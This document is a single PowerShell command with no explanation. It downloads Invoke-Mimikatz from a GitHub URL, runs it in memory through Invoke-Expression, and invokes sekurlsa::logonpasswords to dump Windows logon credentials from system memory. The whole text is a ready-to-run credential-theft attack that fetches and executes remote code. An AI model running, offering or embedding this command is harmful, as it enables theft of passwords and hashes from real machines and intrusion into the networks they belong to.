powershell -Command "Invoke-Expression ((New-Object Net.WebClient).DownloadString('https://github.com/bcaseiro/testing/Invoke-Mimikatz.Ps1')); Invoke-Mimikatz -Command 'Privilege::Debug Sekurlsa::Logonpasswords Exit'"


